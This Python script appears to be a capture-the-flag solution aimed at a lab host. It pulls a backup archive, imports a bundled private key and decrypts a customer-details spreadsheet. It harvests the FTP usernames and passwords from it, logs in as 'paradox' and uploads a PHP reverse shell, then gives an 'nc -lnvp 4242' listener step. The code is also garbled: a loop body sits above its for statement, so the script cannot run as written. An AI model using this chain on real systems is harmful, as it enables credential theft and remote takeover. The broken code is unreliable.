from ftplib import FTP
from io import BytesIO
from openpyxl import load_workbook
from zipfile import ZipFile

import os
import requests

host  = "10.10.36.255"
wd    = os.getcwd()

# http://10.10.36.255/backups/backup.zip
url = "http://" + host + "/backups/backup.zip"

resp = requests.get(url)
file = ZipFile(BytesIO(resp.content))

file.extractall(path=wd+"/zips")

privkey       = wd+"/zips/priv.key"
xlsxencypted  = wd+"/zips/CustomerDetails.xlsx.gpg"

os.system("gpg --import " + privkey)
os.system("gpg " + xlsxencypted)

xlsxdecrypted = wd+"/zips/CustomerDetails.xlsx"

wrkbk = load_workbook(xlsxdecrypted)

sh = wrkbk.active

unpw = {}
  unpw[(str)(sh.cell(row=i, column=2)._value)] = (str)(sh.cell(row=i, column=3)._value)

for i in range(2, sh.max_row+1):

print("Try the following combinations for the ftp service")
print(unpw)

print("----------")

print("Paradox one is the one that works !!, Now Uploading the reverse shell")
print("Here you should modify the shell.php file appropriately baased on your IPs")

shellfile = wd + "/shell.php"
remotefile = "shell.php"

server = FTP()
server.connect(host, 21)

server.login('paradox', unpw['paradox'])
server.dir()

with open(shellfile, "rb") as payloadfile:
  server.storbinary('STOR %s' % remotefile, payloadfile)

print("Upload should be complete now, and you can do 'nc -lnvp 4242' on your box and go to http://{}:80/shell.php on the browser".format(host))